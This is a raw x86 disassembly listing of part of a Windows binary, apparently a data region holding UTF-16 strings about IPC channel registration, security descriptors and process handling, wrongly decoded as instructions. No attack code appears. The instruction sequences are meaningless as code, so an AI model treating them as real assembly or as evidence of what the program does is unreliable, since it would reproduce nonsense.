  405e38:	add    BYTE PTR [eax+eax*1+0x69],ch
  405e3c:	add    BYTE PTR [esi+0x0],ch
  405e3f:	add    BYTE PTR [bx+si],ah
  405e42:	add    BYTE PTR [edx+0x0],dl
  405e45:	add    BYTE PTR gs:[ebx+0x0],dh
  405e49:	jne    0x405e4b
  405e4b:	ins    DWORD PTR es:[edi],dx
  405e4c:	add    BYTE PTR [ebp+0x0],ah
  405e4f:	dec    ebp
  405e50:	add    BYTE PTR [ebp+0x0],ah
  405e53:	add    BYTE PTR fs:[ecx+0x0],ch
  405e57:	popa   
  405e58:	add    BYTE PTR [edx+0x0],dl
  405e5b:	add    BYTE PTR gs:[ebx+0x0],ah
  405e5f:	outs   dx,DWORD PTR ds:[esi]
  405e60:	add    BYTE PTR [edx+0x0],dh
  405e63:	add    BYTE PTR fs:[ebp+0x0],ah
  405e67:	jb     0x405e69
  405e69:	add    BYTE PTR [ebp+0x52],dl
  405e6c:	add    BYTE PTR [ebp+0x0],ah
  405e6f:	jae    0x405e71
  405e71:	jne    0x405e73
  405e73:	ins    DWORD PTR es:[edi],dx
  405e74:	add    BYTE PTR [ebp+0x0],ah
  405e77:	dec    ebp
  405e78:	add    BYTE PTR [ebp+0x0],ah
  405e7b:	add    BYTE PTR fs:[ecx+0x0],ch
  405e7f:	popa   
  405e80:	add    BYTE PTR [edx+0x0],dl
  405e83:	add    BYTE PTR gs:[ebx+0x0],ah
  405e87:	outs   dx,DWORD PTR ds:[esi]
  405e88:	add    BYTE PTR [edx+0x0],dh
  405e8b:	add    BYTE PTR fs:[ebp+0x0],ah
  405e8f:	jb     0x405e91
  405e91:	and    BYTE PTR [eax],al
  405e93:	inc    ebx
  405e94:	add    BYTE PTR [edi+0x0],ch
  405e97:	ins    DWORD PTR es:[edi],dx
  405e98:	add    BYTE PTR [eax+0x0],dh
  405e9b:	ins    BYTE PTR es:[edi],dx
  405e9c:	add    BYTE PTR [ebp+0x0],ah
  405e9f:	je     0x405ea1
  405ea1:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  405ea6:	add    BYTE PTR [ebx+0x0],dl
  405ea9:	jne    0x405eab
  405eab:	arpl   WORD PTR [eax],ax
  405ead:	arpl   WORD PTR [eax],ax
  405eaf:	add    BYTE PTR gs:[ebx+0x0],dh
  405eb3:	jae    0x405eb5
  405eb5:	data16 add BYTE PTR [ebp+0x0],dh
  405eb9:	ins    BYTE PTR es:[edi],dx
  405eba:	add    BYTE PTR [eax+eax*1+0x79],ch
  405ebe:	add    BYTE PTR [eax],al
  405ec0:	dec    ecx
  405ec1:	inc    ebx
  405ec2:	add    BYTE PTR [ecx+0x0],ah
  405ec5:	ins    BYTE PTR es:[edi],dx
  405ec6:	add    BYTE PTR [eax+eax*1+0x69],ch
  405eca:	add    BYTE PTR [esi+0x0],ch
  405ecd:	add    BYTE PTR [bx+si],ah
  405ed0:	add    BYTE PTR [eax+eax*1+0x68],dh
  405ed4:	add    BYTE PTR [ebp+0x0],ah
  405ed7:	and    BYTE PTR [eax],al
  405ed9:	add    BYTE PTR gs:[esi+0x0],ch
  405edd:	add    BYTE PTR [bx+di+0x0],ch
  405ee1:	outs   dx,BYTE PTR ds:[esi]
  405ee2:	add    BYTE PTR [ebp+0x0],ah
  405ee5:	and    BYTE PTR [eax],al
  405ee7:	push   ebx
  405ee8:	add    BYTE PTR [eax+eax*1+0x6f],dh
  405eec:	add    BYTE PTR [eax+0x0],dh
  405eef:	push   esi
  405ef0:	add    BYTE PTR [ecx+0x0],ch
  405ef3:	add    BYTE PTR fs:[ebp+0x0],ah
  405ef7:	outs   dx,DWORD PTR ds:[esi]
  405ef8:	add    BYTE PTR [edx+0x0],dl
  405efb:	add    BYTE PTR gs:[ebx+0x0],ah
  405eff:	outs   dx,DWORD PTR ds:[esi]
  405f00:	add    BYTE PTR [edx+0x0],dh
  405f03:	add    BYTE PTR fs:[ebp+0x0],ah
  405f07:	jb     0x405f09
  405f09:	add    BYTE PTR [ebp+0x57],bl
  405f0c:	add    BYTE PTR [ecx+0x0],ah
  405f0f:	imul   eax,DWORD PTR [eax],0x460074
  405f15:	outs   dx,DWORD PTR ds:[esi]
  405f16:	add    BYTE PTR [edx+0x0],dh
  405f19:	push   edx
  405f1a:	add    BYTE PTR [ebp+0x0],ah
  405f1d:	arpl   WORD PTR [eax],ax
  405f1f:	outs   dx,DWORD PTR ds:[esi]
  405f20:	add    BYTE PTR [edx+0x0],dh
  405f23:	add    BYTE PTR fs:[ebp+0x0],ah
  405f27:	jb     0x405f29
  405f29:	push   ebx
  405f2a:	add    BYTE PTR [eax+eax*1+0x6f],dh
  405f2e:	add    BYTE PTR [eax+0x0],dh
  405f31:	cmp    al,BYTE PTR [eax]
  405f33:	and    BYTE PTR [eax],al
  405f35:	push   edx
  405f36:	add    BYTE PTR [ebp+0x0],ah
  405f39:	arpl   WORD PTR [eax],ax
  405f3b:	outs   dx,DWORD PTR ds:[esi]
  405f3c:	add    BYTE PTR [edx+0x0],dh
  405f3f:	add    BYTE PTR fs:[ebp+0x0],ah
  405f43:	jb     0x405f45
  405f45:	and    BYTE PTR [eax],al
  405f47:	jae    0x405f49
  405f49:	je     0x405f4b
  405f4b:	outs   dx,DWORD PTR ds:[esi]
  405f4c:	add    BYTE PTR [eax+0x0],dh
  405f4f:	jo     0x405f51
  405f51:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  405f56:	add    BYTE PTR [esi+0x0],ch
  405f59:	outs   dx,DWORD PTR ds:[esi]
  405f5a:	add    BYTE PTR [edx+0x0],dh
  405f5d:	ins    DWORD PTR es:[edi],dx
  405f5e:	add    BYTE PTR [ecx+0x0],ah
  405f61:	ins    BYTE PTR es:[edi],dx
  405f62:	add    BYTE PTR [eax+eax*1+0x79],ch
  405f66:	add    BYTE PTR [eax],al
  405f68:	gs push edi
  405f6a:	add    BYTE PTR [ecx+0x0],ah
  405f6d:	imul   eax,DWORD PTR [eax],0x460074
  405f73:	outs   dx,DWORD PTR ds:[esi]
  405f74:	add    BYTE PTR [edx+0x0],dh
  405f77:	push   edx
  405f78:	add    BYTE PTR [ebp+0x0],ah
  405f7b:	arpl   WORD PTR [eax],ax
  405f7d:	outs   dx,DWORD PTR ds:[esi]
  405f7e:	add    BYTE PTR [edx+0x0],dh
  405f81:	add    BYTE PTR fs:[ebp+0x0],ah
  405f85:	jb     0x405f87
  405f87:	push   ebx
  405f88:	add    BYTE PTR [eax+eax*1+0x6f],dh
  405f8c:	add    BYTE PTR [eax+0x0],dh
  405f8f:	cmp    al,BYTE PTR [eax]
  405f91:	and    BYTE PTR [eax],al
  405f93:	push   edx
  405f94:	add    BYTE PTR [ebp+0x0],ah
  405f97:	arpl   WORD PTR [eax],ax
  405f99:	outs   dx,DWORD PTR ds:[esi]
  405f9a:	add    BYTE PTR [edx+0x0],dh
  405f9d:	add    BYTE PTR fs:[ebp+0x0],ah
  405fa1:	jb     0x405fa3
  405fa3:	and    BYTE PTR [eax],al
  405fa5:	jae    0x405fa7
  405fa7:	je     0x405fa9
  405fa9:	outs   dx,DWORD PTR ds:[esi]
  405faa:	add    BYTE PTR [eax+0x0],dh
  405fad:	jo     0x405faf
  405faf:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  405fb4:	add    BYTE PTR [eax+eax*1+0x75],ah
  405fb8:	add    BYTE PTR [ebp+0x0],ah
  405fbb:	and    BYTE PTR [eax],al
  405fbd:	je     0x405fbf
  405fbf:	outs   dx,DWORD PTR ds:[esi]
  405fc0:	add    BYTE PTR [eax],ah
  405fc2:	add    BYTE PTR [ebp+0x0],ah
  405fc5:	jb     0x405fc7
  405fc7:	jb     0x405fc9
  405fc9:	outs   dx,DWORD PTR ds:[esi]
  405fca:	add    BYTE PTR [edx+0x0],dh
  405fcd:	add    BYTE PTR [ebx],bl
  405fcf:	imul   eax,DWORD PTR [eax],0x630070
  405fd5:	cmp    al,BYTE PTR [eax]
  405fd7:	das    
  405fd8:	add    BYTE PTR [edi],ch
  405fda:	add    BYTE PTR [ebx+0x0],bh
  405fdd:	xor    BYTE PTR [eax],al
  405fdf:	jge    0x405fe1
  405fe1:	das    
  405fe2:	add    BYTE PTR [ebx+0x0],bh
  405fe5:	xor    DWORD PTR [eax],eax
  405fe7:	jge    0x405fe9
  405fe9:	add    BYTE PTR [eax+0x65005285],al
  405fef:	add    BYTE PTR [edi+0x0],ah
  405ff2:	imul   eax,DWORD PTR [eax],0x740073
  405ff8:	add    BYTE PTR gs:[edx+0x0],dh
  405ffc:	dec    ecx
  405ffd:	add    BYTE PTR [eax+0x0],dh
  406000:	arpl   WORD PTR [eax],ax
  406002:	inc    ebx
  406003:	add    BYTE PTR [eax+0x0],ch
  406006:	popa   
  406007:	add    BYTE PTR [esi+0x0],ch
  40600a:	outs   dx,BYTE PTR ds:[esi]
  40600b:	add    BYTE PTR [ebp+0x0],ah
  40600e:	ins    BYTE PTR es:[edi],dx
  40600f:	add    BYTE PTR [ecx+0x0],al
  406012:	outs   dx,BYTE PTR ds:[esi]
  406013:	add    BYTE PTR [eax+eax*1+0x4e],ah
  406017:	add    BYTE PTR [edi+0x0],ch
  40601a:	je     0x40601c
  40601c:	imul   eax,DWORD PTR [eax],0x790066
  406022:	push   ebx
  406023:	add    BYTE PTR [eax+eax*1+0x61],dh
  406027:	add    BYTE PTR [edx+0x0],dh
  40602a:	je     0x40602c
  40602c:	cmp    al,BYTE PTR [eax]
  40602e:	and    BYTE PTR [eax],al
  406030:	dec    edi
  406031:	add    BYTE PTR [edx+0x0],ah
  406034:	je     0x406036
  406036:	popa   
  406037:	add    BYTE PTR [ecx+0x0],ch
  40603a:	outs   dx,BYTE PTR ds:[esi]
  40603b:	add    BYTE PTR [ebp+0x0],ah
  40603e:	add    BYTE PTR fs:[eax],ah
  406041:	add    BYTE PTR [eax+eax*1+0x68],dh
  406045:	add    BYTE PTR [ebp+0x0],ah
  406048:	and    BYTE PTR [eax],al
  40604a:	jb     0x40604c
  40604c:	add    BYTE PTR gs:[ebp+0x0],ch
  406050:	outs   dx,DWORD PTR ds:[esi]
  406051:	add    BYTE PTR [eax+eax*1+0x65],dh
  406055:	add    BYTE PTR [eax],ah
  406057:	add    BYTE PTR [eax+0x0],dh
  40605a:	jb     0x40605c
  40605c:	outs   dx,DWORD PTR ds:[esi]
  40605d:	add    BYTE PTR [eax+0x0],bh
  406060:	jns    0x406062
  406062:	and    BYTE PTR [eax],al
  406064:	outs   dx,DWORD PTR ds:[esi]
  406065:	add    BYTE PTR [edx+0x0],ah
  406068:	push   0x0
  40606a:	add    BYTE PTR gs:[ebx+0x0],ah
  40606e:	je     0x406070
  406070:	add    BYTE PTR [eax+0x650052a5],al
  406076:	add    BYTE PTR [edi+0x0],ah
  406079:	imul   eax,DWORD PTR [eax],0x740073
  40607f:	add    BYTE PTR gs:[edx+0x0],dh
  406083:	dec    ecx
  406084:	add    BYTE PTR [eax+0x0],dh
  406087:	arpl   WORD PTR [eax],ax
  406089:	inc    ebx
  40608a:	add    BYTE PTR [eax+0x0],ch
  40608d:	popa   
  40608e:	add    BYTE PTR [esi+0x0],ch
  406091:	outs   dx,BYTE PTR ds:[esi]
  406092:	add    BYTE PTR [ebp+0x0],ah
  406095:	ins    BYTE PTR es:[edi],dx
  406096:	add    BYTE PTR [ecx+0x0],al
  406099:	outs   dx,BYTE PTR ds:[esi]
  40609a:	add    BYTE PTR [eax+eax*1+0x4e],ah
  40609e:	add    BYTE PTR [edi+0x0],ch
  4060a1:	je     0x4060a3
  4060a3:	imul   eax,DWORD PTR [eax],0x790066
  4060a9:	push   ebx
  4060aa:	add    BYTE PTR [eax+eax*1+0x61],dh
  4060ae:	add    BYTE PTR [edx+0x0],dh
  4060b1:	je     0x4060b3
  4060b3:	cmp    al,BYTE PTR [eax]
  4060b5:	and    BYTE PTR [eax],al
  4060b7:	push   ebx
  4060b8:	add    BYTE PTR [ebp+0x0],dh
  4060bb:	arpl   WORD PTR [eax],ax
  4060bd:	arpl   WORD PTR [eax],ax
  4060bf:	add    BYTE PTR gs:[ebx+0x0],dh
  4060c3:	jae    0x4060c5
  4060c5:	data16 add BYTE PTR [ebp+0x0],dh
  4060c9:	ins    BYTE PTR es:[edi],dx
  4060ca:	add    BYTE PTR [eax+eax*1+0x79],ch
  4060ce:	add    BYTE PTR [eax],ah
  4060d0:	add    BYTE PTR [esi+0x0],ch
  4060d3:	outs   dx,DWORD PTR ds:[esi]
  4060d4:	add    BYTE PTR [eax+eax*1+0x69],dh
  4060d8:	add    BYTE PTR [esi+0x0],ah
  4060db:	imul   eax,DWORD PTR [eax],0x640065
  4060e1:	and    BYTE PTR [eax],al
  4060e3:	dec    ebp
  4060e4:	add    BYTE PTR [ebp+0x0],ah
  4060e7:	add    BYTE PTR fs:[ecx+0x0],ch
  4060eb:	popa   
  4060ec:	add    BYTE PTR [edx+0x0],dl
  4060ef:	add    BYTE PTR gs:[ebx+0x0],ah
  4060f3:	outs   dx,DWORD PTR ds:[esi]
  4060f4:	add    BYTE PTR [edx+0x0],dh
  4060f7:	add    BYTE PTR fs:[ebp+0x0],ah
  4060fb:	jb     0x4060fd
  4060fd:	push   ebx
  4060fe:	add    BYTE PTR [eax+eax*1+0x61],dh
  406102:	add    BYTE PTR [edx+0x0],dh
  406105:	je     0x406107
  406107:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  40610c:	add    BYTE PTR [ebp+0x0],ah
  40610f:	jbe    0x406111
  406111:	add    BYTE PTR gs:[esi+0x0],ch
  406115:	je     0x406117
  406117:	add    BYTE PTR [eax+0x6500528f],al
  40611d:	add    BYTE PTR [edi+0x0],ah
  406120:	imul   eax,DWORD PTR [eax],0x740073
  406126:	add    BYTE PTR gs:[edx+0x0],dh
  40612a:	dec    ecx
  40612b:	add    BYTE PTR [eax+0x0],dh
  40612e:	arpl   WORD PTR [eax],ax
  406130:	inc    ebx
  406131:	add    BYTE PTR [eax+0x0],ch
  406134:	popa   
  406135:	add    BYTE PTR [esi+0x0],ch
  406138:	outs   dx,BYTE PTR ds:[esi]
  406139:	add    BYTE PTR [ebp+0x0],ah
  40613c:	ins    BYTE PTR es:[edi],dx
  40613d:	add    BYTE PTR [ecx+0x0],al
  406140:	outs   dx,BYTE PTR ds:[esi]
  406141:	add    BYTE PTR [eax+eax*1+0x4e],ah
  406145:	add    BYTE PTR [edi+0x0],ch
  406148:	je     0x40614a
  40614a:	imul   eax,DWORD PTR [eax],0x790066
  406150:	push   ebx
  406151:	add    BYTE PTR [eax+eax*1+0x61],dh
  406155:	add    BYTE PTR [edx+0x0],dh
  406158:	je     0x40615a
  40615a:	cmp    al,BYTE PTR [eax]
  40615c:	and    BYTE PTR [eax],al
  40615e:	inc    ebx
  40615f:	add    BYTE PTR [edi+0x0],ch
  406162:	jne    0x406164
  406164:	ins    BYTE PTR es:[edi],dx
  406165:	add    BYTE PTR [eax+eax*1+0x20],ah
  406169:	add    BYTE PTR [esi+0x0],ch
  40616c:	outs   dx,DWORD PTR ds:[esi]
  40616d:	add    BYTE PTR [eax+eax*1+0x20],dh
  406171:	add    BYTE PTR [eax+0x0],dh
  406174:	jne    0x406176
  406176:	bound  eax,QWORD PTR [eax]
  406178:	ins    BYTE PTR es:[edi],dx
  406179:	add    BYTE PTR [ecx+0x0],ch
  40617c:	jae    0x40617e
  40617e:	push   0x74002000
  406183:	add    BYTE PTR [edi+0x0],ch
  406186:	and    BYTE PTR [eax],al
  406188:	dec    ecx
  406189:	add    BYTE PTR [eax+0x0],dl
  40618c:	inc    ebx
  40618d:	add    BYTE PTR [eax],ah
  40618f:	add    BYTE PTR [ebx+0x0],ah
  406192:	push   0x6e006100
  406197:	add    BYTE PTR [esi+0x0],ch
  40619a:	add    BYTE PTR gs:[eax+eax*1+0x3a],ch
  40619f:	add    BYTE PTR [eax],ah
  4061a1:	add    BYTE PTR [ebx+0x0],bh
  4061a4:	xor    BYTE PTR [eax],al
  4061a6:	jge    0x4061a8
  4061a8:	add    BYTE PTR [edi],cl
  4061aa:	jnp    0x4061ac
  4061ac:	xor    BYTE PTR [eax],al
  4061ae:	jge    0x4061b0
  4061b0:	pop    edi
  4061b1:	add    BYTE PTR [ebx+0x0],bh
  4061b4:	xor    DWORD PTR [eax],eax
  4061b6:	jge    0x4061b8
  4061b8:	add    BYTE PTR [eax+0x65005293],al
  4061be:	add    BYTE PTR [edi+0x0],ah
  4061c1:	imul   eax,DWORD PTR [eax],0x740073
  4061c7:	add    BYTE PTR gs:[edx+0x0],dh
  4061cb:	dec    ecx
  4061cc:	add    BYTE PTR [eax+0x0],dh
  4061cf:	arpl   WORD PTR [eax],ax
  4061d1:	inc    ebx
  4061d2:	add    BYTE PTR [eax+eax*1+0x69],ch
  4061d6:	add    BYTE PTR [ebp+0x0],ah
  4061d9:	outs   dx,BYTE PTR ds:[esi]
  4061da:	add    BYTE PTR [eax+eax*1+0x53],dh
  4061de:	add    BYTE PTR [ebp+0x0],ah
  4061e1:	jb     0x4061e3
  4061e3:	jbe    0x4061e5
  4061e5:	add    BYTE PTR gs:[edx+0x0],dh
  4061e9:	inc    ebx
  4061ea:	add    BYTE PTR [eax+0x0],ch
  4061ed:	popa   
  4061ee:	add    BYTE PTR [esi+0x0],ch
  4061f1:	outs   dx,BYTE PTR ds:[esi]
  4061f2:	add    BYTE PTR [ebp+0x0],ah
  4061f5:	ins    BYTE PTR es:[edi],dx
  4061f6:	add    BYTE PTR [edx],bh
  4061f8:	add    BYTE PTR [eax],ah
  4061fa:	add    BYTE PTR [edx+0x0],dl
  4061fd:	add    BYTE PTR gs:[edi+0x0],ah
  406201:	imul   eax,DWORD PTR [eax],0x740073
  406207:	add    BYTE PTR gs:[edx+0x0],dh
  40620b:	imul   eax,DWORD PTR [eax],0x67006e
  406211:	and    BYTE PTR [eax],al
  406213:	dec    ecx
  406214:	add    BYTE PTR [eax+0x0],dl
  406217:	inc    ebx
  406218:	add    BYTE PTR [eax],ah
  40621a:	add    BYTE PTR [ebx+0x0],ah
  40621d:	push   0x6e006100
  406222:	add    BYTE PTR [esi+0x0],ch
  406225:	add    BYTE PTR gs:[eax+eax*1+0x20],ch
  40622a:	add    BYTE PTR [edi+0x0],ch
  40622d:	outs   dx,BYTE PTR ds:[esi]
  40622e:	add    BYTE PTR [eax],ah
  406230:	add    BYTE PTR [ecx+0x0],cl
  406233:	push   eax
  406234:	add    BYTE PTR [ebx+0x0],al
  406237:	and    BYTE PTR [eax],al
  406239:	jo     0x40623b
  40623b:	outs   dx,DWORD PTR ds:[esi]
  40623c:	add    BYTE PTR [edx+0x0],dh
  40623f:	je     0x406241
  406241:	and    BYTE PTR [eax],al
  406243:	daa    
  406244:	add    BYTE PTR [ebx+0x0],bh
  406247:	xor    BYTE PTR [eax],al
  406249:	jge    0x40624b
  40624b:	daa    
  40624c:	add    BYTE PTR [ecx],al
  40624e:	adc    DWORD PTR [eax+0x0],esi
  406251:	outs   dx,DWORD PTR ds:[esi]
  406252:	add    BYTE PTR [edx+0x0],dh
  406255:	je     0x406257
  406257:	dec    esi
  406258:	add    BYTE PTR [ecx+0x0],ah
  40625b:	ins    DWORD PTR es:[edi],dx
  40625c:	add    BYTE PTR [ebp+0x0],ah
  40625f:	add    BYTE PTR [ecx],cl
  406261:	outs   dx,BYTE PTR ds:[esi]
  406262:	add    BYTE PTR [ecx+0x0],ah
  406265:	ins    DWORD PTR es:[edi],dx
  406266:	add    BYTE PTR [ebp+0x0],ah
  406269:	add    BYTE PTR [edi],bl
  40626b:	popa   
  40626c:	add    BYTE PTR [ebp+0x0],dh
  40626f:	je     0x406271
  406271:	push   0x72006f00
  406276:	add    BYTE PTR [ecx+0x0],ch
  406279:	jp     0x40627b
  40627b:	add    BYTE PTR gs:[eax+eax*1+0x47],ah
  406280:	add    BYTE PTR [edx+0x0],dh
  406283:	outs   dx,DWORD PTR ds:[esi]
  406284:	add    BYTE PTR [ebp+0x0],dh
  406287:	jo     0x406289
  406289:	add    BYTE PTR [eax+0x650052ab],al
  40628f:	add    BYTE PTR [edi+0x0],ah
  406292:	imul   eax,DWORD PTR [eax],0x740073
  406298:	add    BYTE PTR gs:[edx+0x0],dh
  40629c:	dec    ecx
  40629d:	add    BYTE PTR [eax+0x0],dh
  4062a0:	arpl   WORD PTR [eax],ax
  4062a2:	inc    ebx
  4062a3:	add    BYTE PTR [eax+eax*1+0x69],ch
  4062a7:	add    BYTE PTR [ebp+0x0],ah
  4062aa:	outs   dx,BYTE PTR ds:[esi]
  4062ab:	add    BYTE PTR [eax+eax*1+0x53],dh
  4062af:	add    BYTE PTR [ebp+0x0],ah
  4062b2:	jb     0x4062b4
  4062b4:	jbe    0x4062b6
  4062b6:	add    BYTE PTR gs:[edx+0x0],dh
  4062ba:	inc    ebx
  4062bb:	add    BYTE PTR [eax+0x0],ch
  4062be:	popa   
  4062bf:	add    BYTE PTR [esi+0x0],ch
  4062c2:	outs   dx,BYTE PTR ds:[esi]
  4062c3:	add    BYTE PTR [ebp+0x0],ah
  4062c6:	ins    BYTE PTR es:[edi],dx
  4062c7:	add    BYTE PTR [edx],bh
  4062c9:	add    BYTE PTR [eax],ah
  4062cb:	add    BYTE PTR [ebx+0x0],dl
  4062ce:	jne    0x4062d0
  4062d0:	arpl   WORD PTR [eax],ax
  4062d2:	arpl   WORD PTR [eax],ax
  4062d4:	add    BYTE PTR gs:[ebx+0x0],dh
  4062d8:	jae    0x4062da
  4062da:	data16 add BYTE PTR [ebp+0x0],dh
  4062de:	ins    BYTE PTR es:[edi],dx
  4062df:	add    BYTE PTR [eax+eax*1+0x79],ch
  4062e3:	add    BYTE PTR [eax],ah
  4062e5:	add    BYTE PTR [edx+0x0],dh
  4062e8:	add    BYTE PTR gs:[edi+0x0],ah
  4062ec:	imul   eax,DWORD PTR [eax],0x740073
  4062f2:	add    BYTE PTR gs:[edx+0x0],dh
  4062f6:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4062fb:	add    BYTE PTR [ecx+0x0],cl
  4062fe:	push   eax
  4062ff:	add    BYTE PTR [ebx+0x0],al
  406302:	and    BYTE PTR [eax],al
  406304:	arpl   WORD PTR [eax],ax
  406306:	push   0x6e006100
  40630b:	add    BYTE PTR [esi+0x0],ch
  40630e:	add    BYTE PTR gs:[eax+eax*1+0x20],ch
  406313:	add    BYTE PTR [edi+0x0],ch
  406316:	outs   dx,BYTE PTR ds:[esi]
  406317:	add    BYTE PTR [eax],ah
  406319:	add    BYTE PTR [ecx+0x0],cl
  40631c:	push   eax
  40631d:	add    BYTE PTR [ebx+0x0],al
  406320:	and    BYTE PTR [eax],al
  406322:	jo     0x406324
  406324:	outs   dx,DWORD PTR ds:[esi]
  406325:	add    BYTE PTR [edx+0x0],dh
  406328:	je     0x40632a
  40632a:	and    BYTE PTR [eax],al
  40632c:	daa    
  40632d:	add    BYTE PTR [ebx+0x0],bh
  406330:	xor    BYTE PTR [eax],al
  406332:	jge    0x406334
  406334:	daa    
  406335:	add    BYTE PTR [ecx],al
  406337:	cmp    edx,DWORD PTR [ebp+0x0]
  40633a:	outs   dx,BYTE PTR ds:[esi]
  40633b:	add    BYTE PTR [edx+0x0],dl
  40633e:	add    BYTE PTR gs:[edi+0x0],ah
  406342:	imul   eax,DWORD PTR [eax],0x740073
  406348:	add    BYTE PTR gs:[edx+0x0],dh
  40634c:	dec    ecx
  40634d:	add    BYTE PTR [eax+0x0],dh
  406350:	arpl   WORD PTR [eax],ax
  406352:	inc    ebx
  406353:	add    BYTE PTR [eax+0x0],ch
  406356:	popa   
  406357:	add    BYTE PTR [esi+0x0],ch
  40635a:	outs   dx,BYTE PTR ds:[esi]
  40635b:	add    BYTE PTR [ebp+0x0],ah
  40635e:	ins    BYTE PTR es:[edi],dx
  40635f:	add    BYTE PTR [eax],ah
  406361:	add    BYTE PTR [ebx+0x0],dl
  406364:	je     0x406366
  406366:	popa   
  406367:	add    BYTE PTR [edx+0x0],dh
  40636a:	je     0x40636c
  40636c:	imul   eax,DWORD PTR [eax],0x67006e
  406372:	add    BYTE PTR [ebx],dh
  406374:	push   ebp
  406375:	add    BYTE PTR [esi+0x0],ch
  406378:	push   edx
  406379:	add    BYTE PTR [ebp+0x0],ah
  40637c:	add    BYTE PTR [bx+di+0x0],ch
  406380:	jae    0x406382
  406382:	je     0x406384
  406384:	add    BYTE PTR gs:[edx+0x0],dh
  406388:	dec    ecx
  406389:	add    BYTE PTR [eax+0x0],dh
  40638c:	arpl   WORD PTR [eax],ax
  40638e:	inc    ebx
  40638f:	add    BYTE PTR [eax+0x0],ch
  406392:	popa   
  406393:	add    BYTE PTR [esi+0x0],ch
  406396:	outs   dx,BYTE PTR ds:[esi]
  406397:	add    BYTE PTR [ebp+0x0],ah
  40639a:	ins    BYTE PTR es:[edi],dx
  40639b:	add    BYTE PTR [eax],ah
  40639d:	add    BYTE PTR [eax+eax*1+0x6f],al
  4063a1:	add    BYTE PTR [esi+0x0],ch
  4063a4:	add    BYTE PTR gs:[eax],al
  4063a7:	jg     0x4063fe
  4063a9:	add    BYTE PTR [esi+0x0],ch
  4063ac:	push   edx
  4063ad:	add    BYTE PTR [ebp+0x0],ah
  4063b0:	add    BYTE PTR [bx+di+0x0],ch
  4063b4:	jae    0x4063b6
  4063b6:	je     0x4063b8
  4063b8:	add    BYTE PTR gs:[edx+0x0],dh
  4063bc:	dec    ecx
  4063bd:	add    BYTE PTR [eax+0x0],dh
  4063c0:	arpl   WORD PTR [eax],ax
  4063c2:	inc    ebx
  4063c3:	add    BYTE PTR [eax+0x0],ch
  4063c6:	popa   
  4063c7:	add    BYTE PTR [esi+0x0],ch
  4063ca:	outs   dx,BYTE PTR ds:[esi]
  4063cb:	add    BYTE PTR [ebp+0x0],ah
  4063ce:	ins    BYTE PTR es:[edi],dx
  4063cf:	add    BYTE PTR [eax],ah
  4063d1:	add    BYTE PTR [edx],bh
  4063d3:	add    BYTE PTR [eax],ah
  4063d5:	add    BYTE PTR [ebp+0x0],al
  4063d8:	js     0x4063da
  4063da:	arpl   WORD PTR [eax],ax
  4063dc:	add    BYTE PTR gs:[eax+0x0],dh
  4063e0:	je     0x4063e2
  4063e2:	imul   eax,DWORD PTR [eax],0x6e006f
  4063e8:	and    BYTE PTR [eax],al
  4063ea:	ja     0x4063ec
  4063ec:	push   0x6c006900
  4063f1:	add    BYTE PTR [ebp+0x0],ah
  4063f4:	and    BYTE PTR [eax],al
  4063f6:	arpl   WORD PTR [eax],ax
  4063f8:	ins    BYTE PTR es:[edi],dx
  4063f9:	add    BYTE PTR [edi+0x0],ch
  4063fc:	jae    0x4063fe
  4063fe:	imul   eax,DWORD PTR [eax],0x67006e
  406404:	and    BYTE PTR [eax],al
  406406:	dec    ecx
  406407:	add    BYTE PTR [eax+0x0],dl
  40640a:	inc    ebx
  40640b:	add    BYTE PTR [eax],ah
  40640d:	add    BYTE PTR [ebx+0x0],ah
  406410:	push   0x6e006100
  406415:	add    BYTE PTR [esi+0x0],ch
  406418:	add    BYTE PTR gs:[eax+eax*1+0x3a],ch
  40641d:	add    BYTE PTR [eax],ah
  40641f:	add    BYTE PTR [ebx+0x0],bh
  406422:	xor    BYTE PTR [eax],al
  406424:	jge    0x406426
  406426:	add    BYTE PTR [edi+0x49],ch
  406429:	add    BYTE PTR [esi+0x0],ch
  40642c:	jbe    0x40642e
  40642e:	outs   dx,DWORD PTR ds:[esi]
  40642f:	add    BYTE PTR [ebx+0x0],ch
  406432:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  406437:	add    BYTE PTR [esi+0x0],ah
  40643a:	jb     0x40643c
  40643c:	outs   dx,DWORD PTR ds:[esi]
  40643d:	add    BYTE PTR [ebp+0x0],ch
  406440:	and    BYTE PTR [eax],al
  406442:	jo     0x406444
  406444:	popa   
  406445:	add    BYTE PTR [edx+0x0],dh
  406448:	add    BYTE PTR gs:[esi+0x0],ch
  40644c:	je     0x40644e
  40644e:	and    BYTE PTR [eax],al
  406450:	jo     0x406452
  406452:	jb     0x406454
  406454:	outs   dx,DWORD PTR ds:[esi]
  406455:	add    BYTE PTR [ebx+0x0],ah
  406458:	add    BYTE PTR gs:[ebx+0x0],dh
  40645c:	jae    0x40645e
  40645e:	add    BYTE PTR cs:[eax],ah
  406461:	add    BYTE PTR [eax+0x0],cl
  406464:	outs   dx,DWORD PTR ds:[esi]
  406465:	add    BYTE PTR [edi+0x0],ch
  406468:	imul   eax,DWORD PTR [eax],0x69
  40646b:	add    BYTE PTR [esi+0x0],ch
  40646e:	add    BYTE PTR [bx+si],ah
  406471:	add    BYTE PTR [ecx+0x0],ch
  406474:	outs   dx,BYTE PTR ds:[esi]
  406475:	add    BYTE PTR [eax],ah
  406477:	add    BYTE PTR [esi+0x0],ah
  40647a:	outs   dx,DWORD PTR ds:[esi]
  40647b:	add    BYTE PTR [edx+0x0],dh
  40647e:	and    BYTE PTR [eax],al
  406480:	jo     0x406482
  406482:	popa   
  406483:	add    BYTE PTR [edx+0x0],dh
  406486:	add    BYTE PTR gs:[esi+0x0],ch
  40648a:	je     0x40648c
  40648c:	and    BYTE PTR [eax],al
  40648e:	add    BYTE PTR gs:[eax+0x0],bh
  406492:	imul   eax,DWORD PTR [eax],0x4f000074
  406498:	push   ebx
  406499:	add    BYTE PTR [eax+eax*1+0x61],dh
  40649d:	add    BYTE PTR [edx+0x0],dh
  4064a0:	je     0x4064a2
  4064a2:	imul   eax,DWORD PTR [eax],0x67006e
  4064a8:	and    BYTE PTR [eax],al
  4064aa:	je     0x4064ac
  4064ac:	push   0x20006500
  4064b1:	add    BYTE PTR [eax+0x0],dh
  4064b4:	jb     0x4064b6
  4064b6:	outs   dx,DWORD PTR ds:[esi]
